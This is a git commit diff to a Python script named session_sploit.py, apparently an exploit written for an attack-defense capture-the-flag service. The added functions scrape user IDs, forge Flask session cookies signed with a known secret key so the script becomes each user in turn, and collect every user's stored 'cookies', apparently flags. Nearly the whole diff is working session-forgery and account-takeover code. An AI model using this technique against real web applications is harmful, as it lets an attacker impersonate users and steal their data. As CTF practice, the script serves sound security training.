aa07901f8810cf37a9ce8b65f2da2bb62008f61b
Krasnopolskiy Ivan <i1.krasnopolskiy@gmail.com>
2021-01-09 16:49:28 +0300

    Update sploits

--- sploits/session/session_sploit.py
+++ sploits/session/session_sploit.py
@@ -50,7 +50,40 @@ def retrieve_users(s: Session, url: str) -> list:
     url += '/users'
     data = s.get(url).text
     soup = BeautifulSoup(data, 'html.parser')
-    return [user.text for user in soup.find_all(attrs={'class': 'lead'})]
+    print(f'[+] Retrieved users')
+    return [user.text for user in soup.find_all(attrs={'scope': 'row'})]
+
+
+def update_session(s: Session, url: str, user_id: str):
+    session = flask_session.decode(value=s.cookies.get('session'))
+    session['_user_id'] = user_id
+    s.cookies.set('session', flask_session.sign(
+        value=session,
+        secret=SECRET_KEY,
+        salt='cookie-session',
+        legacy=False
+    ), domain=argv[1])
+
+
+def retrieve_cookie_links(s: Session, url: str) -> list:
+    url += '/dashboard'
+    data = s.get(url).text
+    soup = BeautifulSoup(data, 'html.parser')
+    print(f'[+] Retrieved cookie links')
+    return [link['href'] for link in soup.find_all(attrs={'class': 'card-link'})]
+
+
+def retrieve_cookies(s: Session, url: str) -> list:
+    links = retrieve_cookie_links(s, url)
+    cookies = []
+    for link in links:
+        data = s.get(url + link).text
+        soup = BeautifulSoup(data, 'html.parser')
+        cookie_name = soup.find(attrs={'class': 'display-6'}).get_text()
+        cookie_value = soup.find(attrs={'class': 'lead'}).get_text()
+        cookies.append({cookie_name: cookie_value})
+    print(f'[+] Retrieved cookies')
+    return cookies
 
 
 def main() -> None:
@@ -61,15 +94,10 @@ def main() -> None:
         register(s, url)
         login(s, url)
         users = retrieve_users(s, url)
-        current_session = flask_session.decode(value=s.cookies['session'])
-        current_session['_user_id'] = '0'
-        current_session = flask_session.sign(
-            value=current_session,
-            secret=SECRET_KEY,
-            salt='cookie-session',
-            legacy=False
-        )
-        print(current_session)
+        for user_id in users:
+            update_session(s, url, user_id)
+            cookies = retrieve_cookies(s, url)
+            print(cookies)
     except:
         print('[-] Something went wrong')
 
